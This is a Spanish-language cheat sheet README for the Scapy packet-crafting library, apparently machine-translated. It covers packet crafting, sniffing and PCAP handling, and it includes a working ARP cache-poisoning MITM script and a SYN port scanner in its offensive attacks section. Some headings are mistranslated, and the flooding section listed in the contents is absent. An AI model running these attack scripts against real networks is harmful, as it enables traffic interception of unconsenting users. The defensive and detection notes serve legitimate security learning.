<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p align="centro">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Ataques de red">
</p>

<p align="centro">
  <b>🐍 La última herramienta y biblioteca interactiva de manipulación de paquetes basada en Python capaz de falsificar, enviar, rastrear, diseccionar y difuminar paquetes de red arbitrarios</b>
</p>

---

## 📋 Tabla de contenidos

- [Descripción general y modelo de capas de apilamiento (`/`)](#-descripción general--el-modelo-de-capas-de-apilamiento-)
- [Instalación](#-instalación)
- [Iniciando el Shell Interactivo](#-iniciando-el-shell-interactivo)
- [Paquetes de red de elaboración] (#-paquetes-de-red-de-elaboración)
  - [Apretones de manos IP y TCP](#apretones de manos ip-y-tcp)
  - [Ping y ruta de seguimiento ICMP] (#icmp-ping--traceroute)
  - [Consultas DNS y resolución](#dns-queries--resolución)
- [Enviando y recibiendo paquetes](#-enviando--recibiendo-paquetes)
  - [Capa 3: `send()`, `sr()`, `sr1()`](#capa-3-send-sr-sr1)
  - [Capa 2: `sendp()`, `srp()`, `srp1()`](#capa-2-sendp-srp-srp1)
- [Rastreo de paquetes y manejo de PCAP] (#-rastreo de paquetes--manejo de pcap)
  - [Capturando paquetes en vivo (`sniff()`)](#capturing-live-packets-sniff)
  - [Lectura y escritura de archivos PCAP] (#reading--writing-pcap-files)
- [Ataques de red ofensivos](#-ataques-de-red-ofensivos)
  - [Envenenamiento de caché ARP (MITM)](#arp-cache-poisoning-mitm)
  - [Secuencia de comandos de escaneo de puerto SYN] (#syn-port-scanning-script)
  - [Inundación TCP SYN / ICMP](#tcp-syn--icmp-flooding)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consideraciones defensivas y detección](#-consideraciones-defensivas--detección)
- [Aviso legal](#-aviso-legal)

---

## 🎯 Descripción general y modelo de capas de apilamiento (`/`)

Creado por **Philippe Biondi**, **Scapy** reemplaza docenas de herramientas de red de propósito único (ping, traceroute, arpspoof, stubs de nmap).

La genialidad de Scapy reside en utilizar el operador de división de Python (`/`) para apilar capas de protocolo:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Cada campo de capa tiene valores predeterminados sensatos que Scapy calcula automáticamente (sumas de verificación, longitudes, direcciones MAC, IP de origen).

---

## 📥 Instalación
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Iniciar el Shell interactivo

Inicie el shell REPL interactivo (requiere privilegios de root para forjar sockets sin formato):
```bash
sudo scapy
```
Inspeccione los protocolos y funciones disponibles dentro de Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Elaboración de paquetes de red

### Apretones de manos IP y TCP
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### Ping y ruta de seguimiento ICMP
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### Consultas y resolución de DNS
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Envío y recepción de paquetes

Scapy separa la transmisión por capa OSI:

### Capa 3: `send()`, `sr()`, `sr1()`
Funciona con encabezados Ethernet asignados por el kernel (comienza en la capa IP):
- `send(pkt)`: Transmite paquetes en la Capa 3; no espera respuesta.
- `sr(pkt)`: Envía paquetes y devuelve pares `(ans, unans)` respondidos y no respondidos.
- `sr1(pkt)`: envía paquete y devuelve solo el primer paquete de respuesta.

### Capa 2: `sendp()`, `srp()`, `srp1()`
Estructura de enlace de datos/Ethernet personalizada (comienza en `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: envía trama Ethernet sin formato.
- `srp(Ether() / ARP(...))`: envía solicitud ARP y recibe respuesta.

---

## 🔍 Rastreo de paquetes y manejo de PCAP

### Captura de paquetes en vivo (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Lectura y escritura de archivos PCAP
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Ataques ofensivos a la red

### Envenenamiento de caché ARP (MITM)
Falsas tablas ARP para interceptar el tráfico entre la víctima y la puerta de enlace:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### Script de escaneo de puerto SYN
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Tabla de referencia rápida

| Objetivo | Comando aterrador |
|-----------|---------------|
| **Iniciar shell interactivo** | `sudo scapy` |
| **Inspeccionar campos de protocolo** | `ls(IP)` o `ls(TCP)` |
| **Enviar paquete L3** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Enviar y recibir la primera respuesta**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Enviar trama Ethernet L2** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Huele con filtro BPF** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Guardar en PCAP** | `wrpcap("out.pcap", pkts)` |
| **Leer de PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Consideraciones defensivas y detección

1. **Inspección dinámica de ARP (DAI):** Configure conmutadores empresariales con DAI y DHCP Snooping para descartar respuestas ARP gratuitas falsificadas.
2. **Reglas de IDS/Suricata:** Barridos SYN rápidos medio abiertos y combinaciones de indicadores TCP con formato incorrecto (Navidad, NULL) generados por Scapy activan alertas de IDS estándar.

---

## ⚠️ Aviso legal

> [!PRECAUCIÓN]
> Scapy puede generar paquetes con formato incorrecto que provocan condiciones de denegación de servicio o interceptan datos privados. Debe utilizarse estrictamente en evaluaciones de seguridad autorizadas y redes de prueba aisladas.